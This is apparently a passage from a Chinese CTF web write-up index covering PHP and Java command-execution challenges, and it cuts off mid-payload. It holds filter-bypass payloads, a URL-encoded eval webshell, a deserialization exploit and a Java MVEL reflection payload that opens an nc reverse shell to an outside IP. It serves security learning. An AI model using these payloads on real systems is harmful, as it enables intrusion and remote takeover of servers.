<pre><code>base_convert(696468,10,36) =&gt; \"exec\"\n$pi(8768397090111664438,10,30) =&gt; \"getallheaders\"\nexec(getallheaders(){1})\n// \u64cd\u4f5c xx \u548c yy\uff0c\u4e2d\u95f4\u7528\u9017\u53f7\u9694\u5f00\uff0cecho \u90fd\u80fd\u8f93\u51fa\necho xx,yy\n</code></pre> <pre><code>$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})\n</code></pre>"},{"location":"Web/Chapter6/6-13/","title":"URL \u7f16\u7801\u53d6\u53cd\u52a0 ~ \u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-13/#url-\u7f16\u7801\u53d6\u53cd\u52a0--\u7ed5\u8fc7","title":"URL \u7f16\u7801\u53d6\u53cd\u52a0 ~ \u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u7801</p> <pre><code>&lt;?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n            $code=$_GET['code'];\n                    if(strlen($code)&gt;40){\n                                        die(\"This is too Long.\");\n                                                }\n                    if(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n                                        die(\"NO.\");\n                                                }\n                    @eval($code);\n}\nelse{\n            highlight_file(__FILE__);\n}\n</code></pre> <p>\u6211\u4eec\u5c06 php \u4ee3\u7801 URL \u7f16\u7801\u540e\u53d6\u53cd\uff0c\u6211\u4eec\u4f20\u5165\u53c2\u6570\u540e\u670d\u52a1\u7aef\u8fdb\u884c URL \u89e3\u7801</p> <p>\u8fd9\u65f6\u7531\u4e8e\u53d6\u53cd\u540e\uff0c\u4f1a URL \u89e3\u7801\u6210\u4e0d\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u4f1a\u7ed5\u8fc7</p> <p>\u5373\uff0c\u5bf9\u67e5\u8be2\u8bed\u53e5\u53d6\u53cd\uff0c\u7136\u540e\u7f16\u7801</p> <p>\u5728\u7f16\u7801\u524d\u52a0\u4e0a ~ \u8fdb\u884c\u53d6\u53cd\uff0c\u62ec\u53f7\u6ca1\u6709\u88ab\u8fc7\u6ee4\uff0c\u4e0d\u7528\u53d6\u53cd</p> <pre><code>//?code=phpinfo();\n?code=(~%8F%97%8F%96%91%99%90)();\n</code></pre> <p></p> <p>\u6784\u9020\u6728\u9a6c</p> <pre><code>$str1 = 'assert';\necho urlencode(~$str1);\n$str2 = '(eval($_POST[cmd]))';\necho '\\n';\necho urlencode(~$str2);\n\n// %9E%8C%8C%9A%8D%8B\\n%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6\n</code></pre> <p>\u8681\u5251\u6210\u529f\u8fde\u63a5</p> <p></p> <p>\u6700\u540e\u501f\u52a9\u8681\u5251\u63d2\u4ef6\u9009\u62e9 PHP7_GC_UAF \u6a21\u5f0f\u8fd0\u884c /readflag</p> <p></p>"},{"location":"Web/Chapter6/6-14/","title":"\u8f93\u51fa\u91cd\u5b9a\u5411\u7ed5\u8fc7\u65e0\u56de\u663e","text":""},{"location":"Web/Chapter6/6-14/#\u8f93\u51fa\u91cd\u5b9a\u5411\u7ed5\u8fc7\u65e0\u56de\u663e","title":"\u8f93\u51fa\u91cd\u5b9a\u5411\u7ed5\u8fc7\u65e0\u56de\u663e","text":"<p>\u6253\u5f00\u9875\u9762\u662f\u4e00\u4e2a\u767b\u5f55\u6846</p> <p></p> <p>\u5728 BurpSuite \u4e2d\u6293\u5305\u53d1\u73b0\u6709 tip</p> <p></p> <p>\u89e3\u7801\u662f\u540e\u7aef SQL \u8bed\u53e5</p> <p>\u663e\u793a\u5982\u679c\u5bc6\u7801\u7b49\u4e8e\u5b83\u7684 md5 \u503c\u5219\u767b\u9646\u6210\u529f</p> <p></p> <p>\u6784\u9020 payload</p> <pre><code>' union select 1,md5(123)#&amp;password=123\n</code></pre> <p>\u767b\u5f55\u8fdb\u53bb\u662f\u4e00\u4e2a Ping \u7a0b\u5e8f</p> <p></p> <p>127.0.0.1|ls / \u6ca1\u6709\u56de\u663e</p> <p>127.0.0.1|sleep 5 \u6709\u5ef6\u8fdf\u8bf4\u660e\u547d\u4ee4\u6267\u884c\u4e86\uff0c\u4f46\u662f\u8f93\u51fa\u53ef\u80fd\u88ab\u8fc7\u6ee4\u4e86</p> <p>127.0.0.1|cat /flag&gt;1.php \u8f93\u51fa\u91cd\u5b9a\u5411</p> <p></p>"},{"location":"Web/Chapter6/6-15/","title":"\\\\t \u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-15/#t-\u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","title":"\\t \u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u9875\u9762\u7ed9\u51fa\u4e86\u6e90\u7801</p> <pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nfunction check($input){\n    if(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\",$input)){\n        // if(preg_match(\"/'| |_|=|php/\",$input)){\n        die('hacker!!!');\n    }else{\n        return $input;\n    }\n}\n\nfunction waf($input){\n  if(is_array($input)){\n      foreach($input as $key=&gt;$output){\n          $input[$key] = waf($output);\n      }\n  }else{\n      $input = check($input);\n  }\n}\n\n$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';\nif(!file_exists($dir)){\n    mkdir($dir);\n}\nswitch($_GET[\"action\"] ?? \"\") {\n    case 'pwd':\n        echo $dir;\n        break;\n    case 'upload':\n        $data = $_GET[\"data\"] ?? \"\";\n        waf($data);\n        file_put_contents(\"$dir\" . \"index.php\", $data);\n}\n?&gt;\n</code></pre> <p>\u5148\u770b\u770b\u8def\u5f84\u662f\u4ec0\u4e48</p> <p></p> <p>\u6211\u4eec\u9700\u8981\u77e5\u9053\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u6709\u4ec0\u4e48\uff0c\u4f46\u662f\u5e38\u89c1\u7684 eval() \u51fd\u6570\u88ab\u8fc7\u6ee4\u4e86</p> <p>\u4f7f\u7528 `` \u5305\u88f9\u547d\u4ee4\uff0c\u8fd9\u6837 PHP \u5c31\u4f1a\u5c06\u91cc\u9762\u7684\u5185\u5bb9\u5f53\u6210\u547d\u4ee4\u6267\u884c</p> <p>\u6700\u540e\u4f7f\u7528 <code>&lt;?=</code> \u8f93\u51fa\uff0c\u540c\u65f6 <code>\\t</code> \u7ed5\u8fc7\u7a7a\u683c</p> <pre><code>?action=upload&amp;data=&lt;?=`ls\\t/`?&gt;\n</code></pre> <p></p> <p>\u8bbf\u95ee\u6587\u4ef6\u62ff\u5230 flag</p> <pre><code>?action=upload&amp;data=&lt;?=`cat\\t/flllllll1112222222lag`?&gt;\n</code></pre> <p></p>"},{"location":"Web/Chapter6/6-16/","title":"\u5355\u5f15\u53f7\u4ee3\u66ff\u547d\u4ee4\u6267\u884c\u51fd\u6570\u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-16/#-\u4ee3\u66ff\u547d\u4ee4\u6267\u884c\u51fd\u6570\u7ed5\u8fc7","title":"`` \u4ee3\u66ff\u547d\u4ee4\u6267\u884c\u51fd\u6570\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u9875\u9762\u7ed9\u51fa\u4e86\u6e90\u7801</p> <pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nfunction check($input){\n    if(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\",$input)){\n        // if(preg_match(\"/'| |_|=|php/\",$input)){\n        die('hacker!!!');\n    }else{\n        return $input;\n    }\n}\n\nfunction waf($input){\n  if(is_array($input)){\n      foreach($input as $key=&gt;$output){\n          $input[$key] = waf($output);\n      }\n  }else{\n      $input = check($input);\n  }\n}\n\n$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';\nif(!file_exists($dir)){\n    mkdir($dir);\n}\nswitch($_GET[\"action\"] ?? \"\") {\n    case 'pwd':\n        echo $dir;\n        break;\n    case 'upload':\n        $data = $_GET[\"data\"] ?? \"\";\n        waf($data);\n        file_put_contents(\"$dir\" . \"index.php\", $data);\n}\n?&gt;\n</code></pre> <p>\u5148\u770b\u770b\u8def\u5f84\u662f\u4ec0\u4e48</p> <p></p> <p>\u6211\u4eec\u9700\u8981\u77e5\u9053\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u6709\u4ec0\u4e48\uff0c\u4f46\u662f\u5e38\u89c1\u7684 eval() \u51fd\u6570\u88ab\u8fc7\u6ee4\u4e86</p> <p>\u4f7f\u7528 `` \u5305\u88f9\u547d\u4ee4\uff0c\u8fd9\u6837 PHP \u5c31\u4f1a\u5c06\u91cc\u9762\u7684\u5185\u5bb9\u5f53\u6210\u547d\u4ee4\u6267\u884c</p> <p>\u6700\u540e\u4f7f\u7528 <code>&lt;?=</code> \u8f93\u51fa\uff0c\u540c\u65f6 <code>\\t</code> \u7ed5\u8fc7\u7a7a\u683c</p> <pre><code>?action=upload&amp;data=&lt;?=`ls\\t/`?&gt;\n</code></pre> <p></p> <p>\u8bbf\u95ee\u6587\u4ef6\u62ff\u5230 flag</p> <pre><code>?action=upload&amp;data=&lt;?=`cat\\t/flllllll1112222222lag`?&gt;\n</code></pre> <p></p>"},{"location":"Web/Chapter6/6-17/","title":"passthru() RCE","text":""},{"location":"Web/Chapter6/6-17/#passthru-rce","title":"passthru() RCE","text":"<p>\u6253\u5f00\u7f51\u9875</p> <p></p> <p>\u968f\u4fbf\u4f20\u5165\u4e00\u4e2a\u53c2\u6570</p> <pre><code>http://114.67.175.224:16452/?sss\n</code></pre> <p></p> <p>\u6e90\u7801\u89e3\u6790\u4e0b\u5c31\u662f\u6700\u540e\u6211\u4eec\u4f20\u5165\u7684\u53c2\u6570\u503c\u4f1a\u88ab\u6267\u884c</p> <p></p> <p>\u4f7f\u7528 <code>passthru()</code> \u53bb\u6267\u884c\u547d\u4ee4</p> <p></p> <p>\u867d\u7136 <code>cat</code> \u88ab\u8fc7\u6ee4\u4e86\uff0c\u4f46\u8fd8\u53ef\u4ee5\u7528 <code>more</code> \u4ee3\u66ff</p> <p></p>"},{"location":"Web/Chapter6/6-18/","title":"more \u4ee3\u66ff cat \u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-18/#more-\u4ee3\u66ff-cat-\u7ed5\u8fc7","title":"more \u4ee3\u66ff cat \u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875</p> <p></p> <p>\u968f\u4fbf\u4f20\u5165\u4e00\u4e2a\u53c2\u6570</p> <pre><code>http://114.67.175.224:16452/?sss\n</code></pre> <p></p> <p>\u6e90\u7801\u89e3\u6790\u4e0b\u5c31\u662f\u6700\u540e\u6211\u4eec\u4f20\u5165\u7684\u53c2\u6570\u503c\u4f1a\u88ab\u6267\u884c</p> <p></p> <p>\u4f7f\u7528 <code>passthru()</code> \u53bb\u6267\u884c\u547d\u4ee4</p> <p></p> <p>\u867d\u7136 <code>cat</code> \u88ab\u8fc7\u6ee4\u4e86\uff0c\u4f46\u8fd8\u53ef\u4ee5\u7528 <code>more</code> \u4ee3\u66ff</p> <p></p>"},{"location":"Web/Chapter6/6-19/","title":"data \u4f2a\u534f\u8bae RCE","text":""},{"location":"Web/Chapter6/6-19/#data-\u4f2a\u534f\u8bae-rce","title":"data \u4f2a\u534f\u8bae RCE","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u4ee3\u7801</p> <p><code>strstr()</code> \u7528\u4e8e\u67e5\u627e\u5b57\u7b26\u4e32\u9996\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09</p> <p><code>str_replace()</code> \u4ee5\u5176\u4ed6\u5b57\u7b26\u66ff\u6362\u5b57\u7b26\u4e32\u4e2d\u7684\u4e00\u4e9b\u5b57\u7b26\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09</p> <pre><code>&lt;?php\nshow_source(__FILE__);\necho $_GET['hello'];\n$page=$_GET['page'];\nwhile (strstr($page, \"php://\")) {\n    $page=str_replace(\"php://\", \"\", $page);\n}\ninclude($page);\n?&gt;\n</code></pre> <p>\u867d\u7136\u7981\u7528\u4e86 <code>php://</code> \u4f2a\u534f\u8bae\uff0c\u4f46\u662f <code>data://</code> \u8fd8\u53ef\u4ee5\u4f7f\u7528</p> <p>\u5982\u679c\u4f20\u5165\u7684\u6570\u636e\u662f PHP \u4ee3\u7801\uff0c\u5c31\u4f1a\u6267\u884c\u4ee3\u7801\uff0c\u7528\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>data://text/plain;base64,xxxx(base64 \u7f16\u7801\u540e\u7684\u6570\u636e)\n</code></pre> <p>\u6216\u8005</p> <pre><code>data://text/plain,xxx(\u6570\u636e)\n</code></pre> <p></p>"},{"location":"Web/Chapter6/6-2/","title":"eval() RCE","text":""},{"location":"Web/Chapter6/6-2/#eval-rce","title":"eval() RCE","text":"<p>eval() \u51fd\u6570\u628a\u5b57\u7b26\u4e32\u6309\u7167 PHP \u4ee3\u7801\u6765\u6267\u884c\uff0cvar_dump() \u51fd\u6570\u7528\u4e8e\u8f93\u51fa\u53d8\u91cf\u7684\u76f8\u5173\u4fe1\u606f</p> <p></p> <p>\u53ef\u4ee5\u4f7f\u7528 file() \u51fd\u6570\u628a\u6574\u4e2a\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u6570\u7ec4\u4e2d</p> <p>\u901a\u8fc7 eval \u51fd\u6570\u6267\u884c\uff0c\u4f20\u53c2 ?hello=file('flag.php')\uff0c\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter6/6-20/","title":"Create_function() RCE","text":""},{"location":"Web/Chapter6/6-20/#create_function-rce","title":"Create_function() RCE","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u7801</p> <pre><code>&lt;?php\n\nif (isset($_GET['p'])) {\n    $p = unserialize($_GET['p']);\n}\nshow_source(\"index.php\");\n\nclass Noteasy\n{\n    private $a;\n    private $b;\n\n    // \u6784\u9020\u51fd\u6570\uff0c\u4f1a\u5728\u7c7b\u7684\u5bf9\u8c61\u5728\u521b\u5efa\u65f6\u81ea\u52a8\u8c03\u7528\n    public function __construct($a, $b)\n    {\n        $this-&gt;a = $a;\n        $this-&gt;b = $b;\n        $this-&gt;check($a.$b);\n        eval($a.$b);\n    }\n\n\n    // \u6790\u6784\u51fd\u6570\uff0c\u5728\u5bf9\u8c61\u9500\u6bc1\u65f6\u81ea\u52a8\u8c03\u7528\n    public function __destruct()\n    {\n        $a = (string)$this-&gt;a;\n        $b = (string)$this-&gt;b;\n        $this-&gt;check($a.$b);\n        $a(\"\", $b);\n    }\n\n\n    private function check($str)\n    {\n        if (preg_match_all(\"(ls|find|cat|grep|head|tail|echo)\", $str) &gt; 0) die(\"You are a hacker, get out\");\n    }\n\n\n    public function setAB($a, $b)\n    {\n        $this-&gt;a = $a;\n        $this-&gt;b = $b;\n    }\n}\n</code></pre> <p>\u9996\u5148\uff0c\u53cd\u5e8f\u5217\u5316\u4e0d\u8c03\u7528\u6784\u9020\u51fd\u6570</p> <p>\u56e0\u4e3a\u53cd\u5e8f\u5217\u5316\u65f6\u901a\u8fc7\u8bfb\u53d6\u5bf9\u8c61\u7684\u5b57\u8282\u6d41\u6765\u6062\u590d\u5bf9\u8c61\u7684\u72b6\u6001\uff0c\u800c\u4e0d\u662f\u901a\u8fc7\u8c03\u7528\u5bf9\u8c61\u7684\u6784\u9020\u51fd\u6570\u6765\u521b\u5efa\u5bf9\u8c61</p> <p>\u6240\u4ee5\u76f4\u63a5\u6765\u770b\u6790\u6784\u51fd\u6570</p> <pre><code>public function __destruct()\n{\n    // \u5c06\u5c5e\u6027 $a \u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\n    $a = (string)$this-&gt;a;\n\n    // \u5c06\u5c5e\u6027 $b \u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\n    $b = (string)$this-&gt;b;\n\n    // \u8c03\u7528 check \u65b9\u6cd5\uff0c\u4f20\u5165 $a \u548c $b \u8fde\u63a5\u540e\u7684\u5b57\u7b26\u4e32\n    $this-&gt;check($a.$b);\n\n    // \u91cd\u70b9\u4ee3\u7801\n    // \u5c06 $a \u4f5c\u4e3a\u51fd\u6570\u8c03\u7528\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a $b\n    $a(\"\", $b);\n}\n</code></pre> <p>\u4f46\u662f\u7a7a\u7684\u7684\u51fd\u6570\u4e0d\u80fd\u6267\u884c\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u6784\u9020\u4e00\u4e2a</p> <p>\u8fd9\u91cc\u8981\u5229\u7528 <code>Create_function()</code> \u51fd\u6570</p> <pre><code>$func = create_function('$a, $b', 'return $a + $b;');\necho $func(2, 3); // \u8f93\u51fa 5\n</code></pre> <p><code>create_function</code> \u5b9e\u9645\u4e0a\u4f1a\u5728\u5185\u90e8\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a</p> <ol> <li>\u751f\u6210\u4e00\u4e2a\u552f\u4e00\u7684\u51fd\u6570\u540d(\u5982 <code>__lambda_func</code>)</li> <li>\u7528\u7ed9\u5b9a\u7684\u53c2\u6570\u548c\u4ee3\u7801\u4f53\u521b\u5efa\u4e00\u4e2a\u65b0\u51fd\u6570</li> <li>\u8fd4\u56de\u8fd9\u4e2a\u51fd\u6570\u540d\u4ee5\u4fbf\u540e\u7eed\u8c03\u7528</li> </ol> <p>\u6784\u9020\u5e8f\u5217\u5316\u4ee3\u7801</p> <pre><code>&lt;?php\n\nClass Noteast{\n\nPrivate $a;\n\nPrivate $b;\n\nPublic function_construct($a,$b){\n\n$this-&gt;a=$a;\n\n$this-&gt;b=$b;\n\n}\n\n$object=new Noteasy(\"create_function\",';}highlight_file(\"/flag\");/*;');\n\nEcho serialize($object);\n\n}\n</code></pre> <p>\u8fd9\u6837\u76f8\u5f53\u4e8e</p> <pre><code>create_function('', ';}highlight_file(\"/flag\");/*;')\n</code></pre> <p>\u5b9e\u9645\u521b\u5efa\u7684\u4ee3\u7801\u4e3a</p> <pre><code>function __lambda_func() {\n    ;}highlight_file(\"/flag\");/*;\n}\n</code></pre> <p>\u5f97\u5230</p> <pre><code>O:7:\"Noteasy\":2:{s:10:\"Noteasya\";s:15:\"create_function\";s:10:\"Noteasyb\";s:21:';}highlight_file(\"/flag\");/*;\";}\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\u56e0\u4e3a\u662f <code>private</code> \u5c5e\u6027\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528</p> <p>\u5e94\u8be5\u4e3a <code>\\00\u7c7b\u540d\\00</code></p> <pre><code>O:7:\"Noteasy\":2:{s:10:\"\\00Noteasy\\00a\";s:15:\"create_function\";s:10:\"\\00Noteasy\\00b\";s:29:\";}highlight_file(\"/flag\");/*\";}\n</code></pre> <p></p>"},{"location":"Web/Chapter6/6-21/","title":"Java MVEL \u8868\u8fbe\u5f0f\u6ce8\u5165","text":""},{"location":"Web/Chapter6/6-21/#java-mvel-\u8868\u8fbe\u5f0f\u6ce8\u5165","title":"Java MVEL \u8868\u8fbe\u5f0f\u6ce8\u5165","text":"<p>\u6253\u5f00\u9875\u9762\u53ea\u6709\u8fd9\u4e00\u4e2a\u529f\u80fd\u53ef\u7528</p> <p></p> <p>\u5728 Burp \u4e2d\u53d1\u73b0\u54cd\u5e94\u6709\u4e2a <code>source</code></p> <p></p> <p>\u8bbf\u95ee\u62ff\u5230\u6e90\u7801</p> <p></p> <p>\u4f7f\u7528 <code>@RestController</code> \u6ce8\u89e3\uff0c\u8868\u793a\u8fd9\u662f\u4e00\u4e2a Spring MVC \u63a7\u5236\u5668\uff0c\u8fd4\u56de\u503c\u4f1a\u81ea\u52a8\u8f6c\u6362\u4e3a JSON \u54cd\u5e94</p> <pre><code>@RestController\npublic class MVELTest {\n    // \u7c7b\u5185\u5bb9\n}\n</code></pre> <p>\u521d\u59cb\u5316\u4e00\u4e2a <code>Setting</code> \u5bf9\u8c61\uff0c\u5305\u542b\u9ed8\u8ba4\u7684 IP \u5217\u8868\u548c\u6570\u5b57\u53c2\u6570 6</p> <pre><code>private Setting setting = new Setting(\"['115.195.167.159', '115.195.167.159', '164.90.230.201', '174.87.232.68']\", 6);\n</code></pre> <p>\u5904\u7406 POST \u8bf7\u6c42\uff0c\u8def\u5f84\u4e3a <code>/updateSysSetting</code></p> <p>\u63a5\u6536 JSON \u683c\u5f0f\u7684 <code>Setting</code> \u5bf9\u8c61\u4f5c\u4e3a\u8bf7\u6c42\u4f53</p> <p>\u8fd4\u56de JSON \u54cd\u5e94\uff0c\u5b57\u7b26\u7f16\u7801\u4e3a UTF-8</p> <pre><code>@PostMapping(value = \"/updateSysSetting\", produces = \"application/json;charset=UTF-8\")\npublic ResponseObj updateSysSetting(@RequestBody Setting [ES], HttpServletResponse response) {\n    // \u65b9\u6cd5\u5b9e\u73b0\n}\n</code></pre> <p>\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u68c0\u6d4b\u4f20\u5165\u7684\u8868\u8fbe\u5f0f\u662f\u5426\u5305\u542b\u5371\u9669\u5173\u952e\u8bcd\uff08\u5982 Runtime\u3001Process \u7b49\uff09</p> <p>\u5982\u679c\u68c0\u6d4b\u5230\u6076\u610f\u4ee3\u7801\uff0c\u8fd4\u56de 483 \u72b6\u6001\u7801\u548c\u9519\u8bef\u4fe1\u606f</p> <pre><code>if (Pattern.matches(\"\"{?i}.*(system[Runtime|Process|Thread|Lookup|http|Socket|restTemplate|MVEL|flag].*\", [ES].getExp()) {\n    response.setStatus(483);\n    return new ResponseObj(false, \"\u8868\u8fbe\u5f0f\u5305\u542b\u6076\u610f\u4ee3\u7801\", \"\");\n}\n</code></pre> <p>\u4f7f\u7528 MVEL \u5f15\u64ce\u6267\u884c\u4f20\u5165\u7684\u8868\u8fbe\u5f0f</p> <p>\u6355\u83b7\u5e76\u5904\u7406\u6267\u884c\u8fc7\u7a0b\u4e2d\u7684\u5f02\u5e38</p> <pre><code>try {\n    result = MVEL.expl(res.getExp());\n    System.out.println(result.toString());\n} catch (Exception e) {\n    response.setStatus(580);\n    return new ResponseObj(false, \"\u8868\u8fbe\u5f0f\u8bed\u6cd5\u9519\u8bef\", e.getMessage());\n}\n</code></pre> <p>\u5c1d\u8bd5\u5c06\u7ed3\u679c\u8f6c\u6362\u4e3a <code>List&lt;String&gt;</code>\uff08IP \u5217\u8868\uff09</p> <p>\u5982\u679c\u8f6c\u6362\u5931\u8d25\uff0c\u8fd4\u56de 580 \u72b6\u6001\u7801\u548c\u9519\u8bef\u4fe1\u606f</p> <pre><code>try {\n    allowedIP = (List&lt;String&gt;) result;\n} catch (Exception e) {\n    response.setStatus(580);\n    return new ResponseObj(false, \"\u8868\u8fbe\u5f0f\u8fd4\u56de\u503c\u4e0d\u662fIP\u5217\u8868\", e.getMessage());\n}\n</code></pre> <p>\u5206\u6790\u5b8c\u6bd5\u540e\u6211\u4eec\u53ef\u4ee5\u5229\u7528 Java \u7684\u53cd\u5c04\u673a\u5236\u6765 RCE</p> <pre><code>{\n\"exp\": \"''.getClass().forName('java.lang.Run'+'time').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Run'+'time').getMethod('getRu'+'ntime').invoke(null),'nc 144.34.162.13 6666 -e /bin/sh'))\",\n\"limit\": \"60\"\n}\n</code></pre> <p>\u4e0b\u9762\u6765\u89e3\u6790\u4e0b\u8fd9\u6bb5 payload</p> <pre><code>// ''.getClass(): \u83b7\u53d6\u7a7a\u5b57\u7b26\u4e32\u7684 Class \u5bf9\u8c61\n''.getClass().forName('java.lang.Run'+'time')   // .forName('java.lang.Run'+'time'): \u52a8\u6001\u52a0\u8f7d java.lang.Runtime \u7c7b\u5e76\u8fd4\u56de\u5176 Class \u5bf9\u8c61\n  .getMethod('exec',''.getClass())  // \u83b7\u53d6 Runtime.exec(String) \u65b9\u6cd5\u7684 Method \u5bf9\u8c61\n  .invoke(\n    ''.getClass().forName('java.lang.Run'+'time')   // \u518d\u6b21\u83b7\u53d6 Runtime \u7c7b\n      .getMethod('getRu'+'ntime')   // \u83b7\u53d6\u9759\u6001\u65b9\u6cd5 getRuntime()\n      .invoke(null),    // \u8c03\u7528\u8be5\u65b9\u6cd5\uff08invoke(null) \u56e0\u4e3a\u8fd9\u662f\u9759\u6001\u65b9\u6cd5\uff09,\u8fd4\u56de Runtime \u7c7b\u7684\u5355\u4f8b\u5b9e\u4f8b\n    'nc 144.34.162.13 6666 -e /bin/sh'  // \u4f7f\u7528\u524d\u9762\u83b7\u53d6\u7684 exec \u65b9\u6cd5\uff0c\u5728 Runtime \u5b9e\u4f8b\u4e0a\u6267\u884c\u547d\u4ee4\n  )\n</code></pre> <p>\u53d1\u9001 payload</p> <p></p> <p>\u76d1\u542c\u7aef\u53e3\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter6/6-22/","title":"Java \u53cd\u5c04\u673a\u5236 RCE","text":""},{"location":"Web/Chapter6/6-22/#java-\u53cd\u5c04\u673a\u5236-rce","title":"Java \u53cd\u5c04\u673a\u5236 RCE","text":"<p>\u6253\u5f00\u9875\u9762\u53ea\u6709\u8fd9\u4e00\u4e2a\u529f\u80fd\u53ef\u7528</p> <p></p> <p>\u5728 Burp \u4e2d\u53d1\u73b0\u54cd\u5e94\u6709\u4e2a <code>source</code></p> <p></p> <p>\u8bbf\u95ee\u62ff\u5230\u6e90\u7801</p> <p></p> <p>\u4f7f\u7528 <code>@RestController</code> \u6ce8\u89e3\uff0c\u8868\u793a\u8fd9\u662f\u4e00\u4e2a Spring MVC \u63a7\u5236\u5668\uff0c\u8fd4\u56de\u503c\u4f1a\u81ea\u52a8\u8f6c\u6362\u4e3a JSON \u54cd\u5e94</p> <pre><code>@RestController\npublic class MVELTest {\n    // \u7c7b\u5185\u5bb9\n}\n</code></pre> <p>\u521d\u59cb\u5316\u4e00\u4e2a <code>Setting</code> \u5bf9\u8c61\uff0c\u5305\u542b\u9ed8\u8ba4\u7684 IP \u5217\u8868\u548c\u6570\u5b57\u53c2\u6570 6</p> <pre><code>private Setting setting = new Setting(\"['115.195.167.159', '115.195.167.159', '164.90.230.201', '174.87.232.68']\", 6);\n</code></pre> <p>\u5904\u7406 POST \u8bf7\u6c42\uff0c\u8def\u5f84\u4e3a <code>/updateSysSetting</code></p> <p>\u63a5\u6536 JSON \u683c\u5f0f\u7684 <code>Setting</code> \u5bf9\u8c61\u4f5c\u4e3a\u8bf7\u6c42\u4f53</p> <p>\u8fd4\u56de JSON \u54cd\u5e94\uff0c\u5b57\u7b26\u7f16\u7801\u4e3a UTF-8</p> <pre><code>@PostMapping(value = \"/updateSysSetting\", produces = \"application/json;charset=UTF-8\")\npublic ResponseObj updateSysSetting(@RequestBody Setting [ES], HttpServletResponse response) {\n    // \u65b9\u6cd5\u5b9e\u73b0\n}\n</code></pre> <p>\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u68c0\u6d4b\u4f20\u5165\u7684\u8868\u8fbe\u5f0f\u662f\u5426\u5305\u542b\u5371\u9669\u5173\u952e\u8bcd\uff08\u5982 Runtime\u3001Process \u7b49\uff09</p> <p>\u5982\u679c\u68c0\u6d4b\u5230\u6076\u610f\u4ee3\u7801\uff0c\u8fd4\u56de 483 \u72b6\u6001\u7801\u548c\u9519\u8bef\u4fe1\u606f</p> <pre><code>if (Pattern.matches(\"\"{?i}.*(system[Runtime|Process|Thread|Lookup|http|Socket|restTemplate|MVEL|flag].*\", [ES].getExp()) {\n    response.setStatus(483);\n    return new ResponseObj(false, \"\u8868\u8fbe\u5f0f\u5305\u542b\u6076\u610f\u4ee3\u7801\", \"\");\n}\n</code></pre> <p>\u4f7f\u7528 MVEL \u5f15\u64ce\u6267\u884c\u4f20\u5165\u7684\u8868\u8fbe\u5f0f</p> <p>\u6355\u83b7\u5e76\u5904\u7406\u6267\u884c\u8fc7\u7a0b\u4e2d\u7684\u5f02\u5e38</p> <pre><code>try {\n    result = MVEL.expl(res.getExp());\n    System.out.println(result.toString());\n} catch (Exception e) {\n    response.setStatus(580);\n    return new ResponseObj(false, \"\u8868\u8fbe\u5f0f\u8bed\u6cd5\u9519\u8bef\", e.getMessage());\n}\n</code></pre> <p>\u5c1d\u8bd5\u5c06\u7ed3\u679c\u8f6c\u6362\u4e3a <code>List&lt;String&gt;</code>\uff08IP \u5217\u8868\uff09</p> <p>\u5982\u679c\u8f6c\u6362\u5931\u8d25\uff0c\u8fd4\u56de 580 \u72b6\u6001\u7801\u548c\u9519\u8bef\u4fe1\u606f</p> <pre><code>try {\n    allowedIP = (List&lt;String&gt;) result;\n} catch (Exception e) {\n    response.setStatus(580);\n    return new ResponseObj(false, \"\u8868\u8fbe\u5f0f\u8fd4\u56de\u503c\u4e0d\u662fIP\u5217\u8868\", e.getMessage());\n}\n</code></pre> <p>\u5206\u6790\u5b8c\u6bd5\u540e\u6211\u4eec\u53ef\u4ee5\u5229\u7528 Java \u7684\u53cd\u5c04\u673a\u5236\u6765 RCE</p> <pre><code>{\n\"exp\": \"''.getClass().forName('java.lang.Run'+'time').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Run'+'time').getMethod('getRu'+'ntime').invoke(null),'nc 144.34.162.13 6666 -e 